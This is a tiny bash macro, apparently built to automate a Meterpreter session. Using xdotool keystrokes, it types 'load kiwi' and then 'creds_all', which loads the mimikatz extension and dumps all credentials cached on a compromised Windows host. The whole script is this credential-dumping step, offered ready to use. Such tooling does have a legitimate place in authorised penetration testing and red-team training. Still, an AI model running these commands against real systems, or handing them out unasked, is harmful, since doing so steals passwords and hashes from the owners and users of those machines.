#!/bin/bash

: '
meterpreter: show creds_all (mimikatz)
'

paste_command "load kiwi"
xdotool key Return
sleep 1

paste_command "creds_all"
xdotool key Return
sleep 1
